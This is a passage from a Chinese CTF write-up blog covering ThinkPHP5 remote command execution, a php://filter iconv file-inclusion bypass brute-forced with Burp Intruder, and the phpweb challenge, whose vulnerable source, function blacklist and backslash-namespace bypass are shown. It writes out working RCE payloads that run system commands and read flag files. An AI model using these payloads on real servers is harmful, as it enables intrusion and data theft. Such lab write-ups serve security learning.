‘template&#x2F;flag’这里面没abc，第一个assert为真；第二个执行 cat templates&#x2F;flag.php ，这没啥好说的，就是去拿我们要的flag，不过注意cat后的文件路径。我们当前在index.php下，index.php和templates同目录，flag.php又在templates下。所以相对路径就是<code>templates/flag.php</code>。最后一个断言是找flag.php中有没有俩点，没有返回false。因为是两个and连接，三个条件都为真即为真。然后直接require($file)，执行命令。<br>flag藏在源码里：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902182614238-883024157.png" alt="image"></p><h2 id="php-rce"><a href="#php-rce" class="headerlink" title="php_rce"></a><strong>php_rce</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902193727121-429631782.png" alt="image"><br>Github搜下有关这个ThinkPHPV5的相关漏洞，发现有一大堆远程命令执行的POC：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200111760-1487399677.png" alt="image"><br>找个长的试试：<br><code>s=index/%5Cthink%5Capp/invokefunction&amp;function=call_user_func_array&amp;vars%5B0%5D=phpinfo&amp;vars%5B1%5D%5B%5D=1</code><br>执行了phpinfo()这个命令<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200144506-2129745043.png" alt="image"><br>ls看下当前目录下的文件：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200315231-1913861343.png" alt="image"><br>没有和flag有关的东西，等会用find找一下，不过这里有个和爬虫有关的robots.txt，让我看看你：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200424907-1518032191.png" alt="image"><br>可惜啥也没有，find命令找下和flag有关的东西：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=find /%20 -name &quot;flag*&quot;</code><br>find是全磁盘查找所以可能会比较慢：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200658223-1816441800.png" alt="image"><br>草了，还是看看根目录下都啥东西吧：<br><code>?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=ls /</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902200800369-192377013.png" alt="image"><br>有个flag: ls &#x2F;flag没啥有价值的东西，直接 cat &#x2F;flag读一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230902201445887-2027647501.png" alt="image"></p><h2 id="题目名称-文件包含"><a href="#题目名称-文件包含" class="headerlink" title="题目名称-文件包含"></a><strong>题目名称-文件包含</strong></h2><h2 id="进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb"><a href="#进入环境，朴实无华的一小段php，直接filter伪协议读flag-php源码：回显了dont-hack！估计check-php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert-iconv-UTF-8-UCS-4BE-resource-check-php这种类型的过滤器，那就试试这个：-filename-php-filter-convert-iconv-UTF-8-UCS-4BE-resource-check-php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https-blog-csdn-net-gsumall04-article-details-131807065-ops-request-misc-257B-2522request-255Fid-2522-253A-2522169373375216800222871982-2522-252C-2522scm-2522-253A-252220140713-130102334-2522-257D-request-id-169373375216800222871982-biz-id-0-utm-medium-distribute-pc-search-result-none-task-blog-2-all-top-positive-default-1-131807065-null-null-142-v93-koosearch-v1-utm-term-E9-A2-98-E7-9B-AE-E5-90-8D-E7-A7-B0-E6-96-87-E4-BB-B6-E5-8C-85-E5-90-AB-spm-1018-2226-3001-4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag-php而不是别的：一是很多flag都在这个文件里，二是直接访问flag-php时它并没给我们报错-网鼎杯-2020-朱雀组-phpweb" class="headerlink" title="进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了convert.iconv.UTF-8*.UCS-4BE.resource=./check.php这种类型的过滤器，那就试试这个：?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：直接去翻了wp。。感谢这位师傅：https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：根据长度排列一下：拿到flag：最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:[网鼎杯 2020 朱雀组]phpweb"></a>进入环境，朴实无华的一小段php，直接filter伪协议读flag.php源码：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180701730-2096930147.png" alt="image"><br>回显了dont hack！估计check.php起作用然后触发什么关键词了。。这时候想到之前做过的一道题：用了<br><code>convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br>这种类型的过滤器，那就试试这个：<br><code>?filename=php://filter/convert.iconv.UTF-8*.UCS-4BE.resource=./check.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903180953978-745219457.png" alt="image"><br>过滤器对了但是用法不对，那可能是input-encoding和output-encoding不对。。需要一个一个找。。但这玩意可用的编码实在太多：<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE*<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<br>    <span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE*<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><br>    <span class="hljs-attribute">UTF7</span>-IMAP<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ASCII</span>*<br>    <span class="hljs-attribute">EUC</span>-JP*<br>    <span class="hljs-attribute">SJIS</span>*<br>    <span class="hljs-attribute">eucJP</span>-win*<br>    <span class="hljs-attribute">SJIS</span>-win*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<br>    <span class="hljs-attribute">CP932</span><br>    <span class="hljs-attribute">CP51932</span><br>    <span class="hljs-attribute">SJIS</span>-mac（别名：MacJapanese）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO（别名：SJIS-DOCOMO）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#KDDI（别名：SJIS-KDDI）<br>    <span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK（别名：SJIS-SOFTBANK）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO（别名：UTF-<span class="hljs-number">8</span>-DOCOMO）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B（别名：UTF-<span class="hljs-number">8</span>-KDDI）<br>    <span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK（别名：UTF-<span class="hljs-number">8</span>-SOFTBANK）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI（别名：ISO-<span class="hljs-number">2022</span>-JP-KDDI）<br>    <span class="hljs-attribute">JIS</span><br>    <span class="hljs-attribute">JIS</span>-ms<br>    <span class="hljs-attribute">CP50220</span><br>    <span class="hljs-attribute">CP50220raw</span><br>    <span class="hljs-attribute">CP50221</span><br>    <span class="hljs-attribute">CP50222</span><br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span>*<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span>*<br>    <span class="hljs-attribute">byte2be</span><br>    <span class="hljs-attribute">byte2le</span><br>    <span class="hljs-attribute">byte4be</span><br>    <span class="hljs-attribute">byte4le</span><br>    <span class="hljs-attribute">BASE64</span><br>    <span class="hljs-attribute">HTML</span>-ENTITIES（别名：HTML）<br>    <span class="hljs-attribute">7bit</span><br>    <span class="hljs-attribute">8bit</span><br>    <span class="hljs-attribute">EUC</span>-CN*<br>    <span class="hljs-attribute">CP936</span><br>    <span class="hljs-attribute">GB18030</span><br>    <span class="hljs-attribute">HZ</span><br>    <span class="hljs-attribute">EUC</span>-TW*<br>    <span class="hljs-attribute">CP950</span><br>    <span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span>*<br>    <span class="hljs-attribute">EUC</span>-KR*<br>    <span class="hljs-attribute">UHC</span>（别名：CP949）<br>    <span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span>（别名：CP1251）<br>    <span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span>（别名：CP1252）<br>    <span class="hljs-attribute">CP866</span>（别名：IBM866）<br>    <span class="hljs-attribute">KOI8</span>-R*<br>    <span class="hljs-attribute">KOI8</span>-U*<br>    <span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span>（别名：ArmSCII8<br></code></pre></td></tr></table></figure><br>直接去翻了wp。。感谢这位师傅：<br><code>https://blog.csdn.net/gsumall04/article/details/131807065?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169373375216800222871982%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169373375216800222871982&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131807065-null-null.142^v93^koosearch_v1&amp;utm_term=%E9%A2%98%E7%9B%AE%E5%90%8D%E7%A7%B0-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB&amp;spm=1018.2226.3001.4187</code><br>我是懒狗就不一个一个加了。。也不知道有没有编码的字典，能方便不少。我放了4种熟悉下步骤：burpsuite的intruder模块爆一下，选择集束炸弹模式：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191411125-1673822326.png" alt="image"><br>根据长度排列一下：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191442857-1708949819.png" alt="image"><br>拿到flag：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903191453864-1253755233.png" alt="image"><br>最后说下为什么要去读flag.php而不是别的：一是很多flag都在这个文件里，二是直接访问flag.php时它并没给我们报错:<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192129048-1514343739.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230903192145289-1200878021.png" alt="image"><br><figure class="highlight tap"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs tap"><br><br>1xx（信息性状态码）：表示请求已被接收，继续处理。<br>   <span class="hljs-number"> 100 </span>Continue：服务器已接收到请求的初始部分，客户端应继续发送剩余部分。<br>   <span class="hljs-number"> 101 </span>Switching Protocols：服务器已理解并接受客户端的请求，将切换到新的协议。<br><br>2xx（成功状态码）：表示请求已成功被服务器接收、理解和处理。<br>   <span class="hljs-number"> 200 </span>OK：请求成功，服务器返回请求的内容。<br>   <span class="hljs-number"> 201 </span>Created：请求成功，服务器创建了新资源。<br>   <span class="hljs-number"> 204 </span>No Content：请求成功，服务器处理成功，但没有返回任何内容。<br><br>3xx（重定向状态码）：表示需要进一步操作以完成请求。<br>   <span class="hljs-number"> 301 </span>Moved Permanently：请求的资源已永久移动到新位置。<br>   <span class="hljs-number"> 302 </span>Found：请求的资源临时移动到新位置。<br>   <span class="hljs-number"> 304 </span>Not Modified：资源未修改，客户端可以使用缓存的版本。<br><br>4xx（客户端错误状态码）：表示客户端发送的请求有错误。<br>   <span class="hljs-number"> 400 </span>Bad Request：请求无效，服务器无法理解。<br>   <span class="hljs-number"> 401 </span>Unauthorized：请求要求身份验证。<br>   <span class="hljs-number"> 404 </span>Not Found：请求的资源不存在。<br><br>5xx（服务器错误状态码）：表示服务器在处理请求时发生错误。<br>   <span class="hljs-number"> 500 </span>Internal Server Error：服务器遇到了意外错误。<br>   <span class="hljs-number"> 502 </span>Bad Gateway：服务器作为网关或代理，从上游服务器接收到无效响应。<br>   <span class="hljs-number"> 503 </span>Service Unavailable：服务器当前无法处理请求，通常由于过载或维护。<br></code></pre></td></tr></table></figure><br><strong>[网鼎杯 2020 朱雀组]phpweb</strong></h2><p>进入环境：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093450823-256892203.png" alt="image"><br>没啥特别的。。不过这页面没过几秒就会刷新一下，出现下面这种东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093541288-1989671347.png" alt="image"><br>他说某个和data有关的函数设置有问题?右键看下源码有啥东西：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093749742-1998449790.png" alt="image"><br>burpsuite抓下包看看：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904093907037-1988636454.png" alt="image"><br>下面有个这个东西：<br><code>func=date&amp;p=Y-m-d+h%3Ai%3As+a</code><br>前面是个函数？后面是他的参数？看着像命令执行，改成system(‘ls’)看看效果：<br><code>func=system&amp;p=ls</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904094304564-1249635122.png" alt="image"><br>回显了hacker。。估计是太直白了，system&#x2F;eval都会回显Hacker。include&#x2F;require函数读下index.php的源码？<br><code>func=include&amp;p=php://filter/read=convert.base64-encode/resource=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904100428721-1887388885.png" alt="image"><br>提示call_user_func()函数找不到第一个参数include&#x2F;require或这是一个无效的函数名？怎么会找不到include()函数呢？问了下GPT发现call_back_func不是所有函数都能执行，它是<strong>调用一个回调函数或方法</strong>。而且并不是所有函数都是回调函数，判断一个函数能否回调可以用<code>is_callable</code>函数，比如：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果：不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>不得不说CHATGPT这东西确实好用，我问他call_back_func(include,php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;index.php)为什么不行时他不光给了不可用的理由，还建议我用file_get_contents()函数去读文件：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102026887-1995512140.png" alt="image"><br>差点把这东西忘了，既然它可以回调就file_get_contents(index.php)读下Index.php：<br><code>func=file_get_contents&amp;p=index.php</code><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904102245157-1804309849.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br>   <span class="hljs-variable">$disable_fun</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-string">&quot;shell_exec&quot;</span>,<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-string">&quot;passthru&quot;</span>,<span class="hljs-string">&quot;proc_open&quot;</span>,<span class="hljs-string">&quot;show_source&quot;</span>,<span class="hljs-string">&quot;phpinfo&quot;</span>,<span class="hljs-string">&quot;popen&quot;</span>,<span class="hljs-string">&quot;dl&quot;</span>,<span class="hljs-string">&quot;eval&quot;</span>,<span class="hljs-string">&quot;proc_terminate&quot;</span>,<span class="hljs-string">&quot;touch&quot;</span>,<span class="hljs-string">&quot;escapeshellcmd&quot;</span>,<span class="hljs-string">&quot;escapeshellarg&quot;</span>,<span class="hljs-string">&quot;assert&quot;</span>,<span class="hljs-string">&quot;substr_replace&quot;</span>,<span class="hljs-string">&quot;call_user_func_array&quot;</span>,<span class="hljs-string">&quot;call_user_func&quot;</span>,<span class="hljs-string">&quot;array_filter&quot;</span>, <span class="hljs-string">&quot;array_walk&quot;</span>,  <span class="hljs-string">&quot;array_map&quot;</span>,<span class="hljs-string">&quot;registregister_shutdown_function&quot;</span>,<span class="hljs-string">&quot;register_tick_function&quot;</span>,<span class="hljs-string">&quot;filter_var&quot;</span>, <span class="hljs-string">&quot;filter_var_array&quot;</span>, <span class="hljs-string">&quot;uasort&quot;</span>, <span class="hljs-string">&quot;uksort&quot;</span>, <span class="hljs-string">&quot;array_reduce&quot;</span>,<span class="hljs-string">&quot;array_walk&quot;</span>, <span class="hljs-string">&quot;array_walk_recursive&quot;</span>,<span class="hljs-string">&quot;pcntl_exec&quot;</span>,<span class="hljs-string">&quot;fopen&quot;</span>,<span class="hljs-string">&quot;fwrite&quot;</span>,<span class="hljs-string">&quot;file_put_contents&quot;</span>);<span class="hljs-comment">//黑名单，禁用了很多函数</span><br>   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">gettime</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span></span>) </span>&#123;<br>       <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>); <span class="hljs-comment">//调用call_user_func函数，注意该函数只能调用可以回调的函数</span><br>       <span class="hljs-variable">$a</span>= <span class="hljs-title function_ invoke__">gettype</span>(<span class="hljs-variable">$result</span>); <span class="hljs-comment">//$result是什么类型？</span><br>       <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span> == <span class="hljs-string">&quot;string&quot;</span>) &#123; <span class="hljs-comment">//如果是字符串</span><br>           <span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br>       &#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;&#125; <span class="hljs-comment">//如果是其它</span><br>   &#125;<br>   <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Test</span> </span>&#123;<br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$p</span> = <span class="hljs-string">&quot;Y-m-d h:i:s a&quot;</span>;<span class="hljs-comment">//旧式的用于声明类属性（成员变量）的关键字，新版本的PHP多用 public等</span><br>       <span class="hljs-keyword">var</span> <span class="hljs-variable">$func</span> = <span class="hljs-string">&quot;date&quot;</span>;<br>       <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>) </span>&#123;<br>           <span class="hljs-keyword">if</span> (<span class="hljs-variable language_">$this</span>-&gt;func != <span class="hljs-string">&quot;&quot;</span>) &#123;<br>               <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$this</span>-&gt;p);<br>           &#125;<br>       &#125;<br>   &#125;<br>   <span class="hljs-variable">$func</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;func&quot;</span>];<span class="hljs-comment">//获取通过 GET、POST 和 COOKIE 方法传递的参数</span><br>   <span class="hljs-variable">$p</span> = <span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&quot;p&quot;</span>];<br><br>   <span class="hljs-keyword">if</span> (<span class="hljs-variable">$func</span> != <span class="hljs-literal">null</span>) &#123;<br>       <span class="hljs-variable">$func</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$func</span>);<br>       <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$func</span>,<span class="hljs-variable">$disable_fun</span>)) &#123;<br>           <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">gettime</span>(<span class="hljs-variable">$func</span>, <span class="hljs-variable">$p</span>);<br>       &#125;<span class="hljs-keyword">else</span> &#123;<br>           <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Hacker...&quot;</span>);<br>       &#125;<br>   &#125;<br>   <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>尝试用相对路径读有没有flag.php这东西。。没试出来。。就去网上找了下wp。感觉已经很接近结果了有点不甘心😔感谢这位师傅的文章：<br><code>https://blog.csdn.net/qq_58784379/article/details/120877859</code><br>第一种方法：<br>在PHP中的函数前面加个\并不印象函数运行(php内的” \ “在做代码执行的时候，会识别特殊字符串，绕过黑名单)。拿前面那个is_callable函数举个例子：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><br><span class="hljs-variable">$callback</span> = <span class="hljs-string">&#x27;include&#x27;</span>;<br><br><span class="hljs-keyword">if</span> (\<span class="hljs-title function_ invoke__">is_callable</span>(<span class="hljs-variable">$callback</span>)) &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;可以回调&#x27;</span>;<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;不可回调&#x27;</span>;<br>&#125;<br><span class="hljs-comment">//结果仍是不可回调</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>问了下GPT，这个\是一种命名空间限定符，用于告诉 PHP 解释器要使用全局命名空间中的函数，而不是当前命名空间中的函数。如果没有使用命名空间或没有同名函数存在于全局命名空间中，添加反斜杠将没有实际影响。<br><code>func=\system&amp;p=find / -name &quot;flag*&quot;//跟以前做的题一样，只要用find找东西就是全磁盘查找，会很慢</code><br>回显：<br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110040442-185642157.png" alt="image"><br><img src="https://img2023.cnblogs.com/blog/3262476/202309/3262476-20230904110103088-327207158.png" 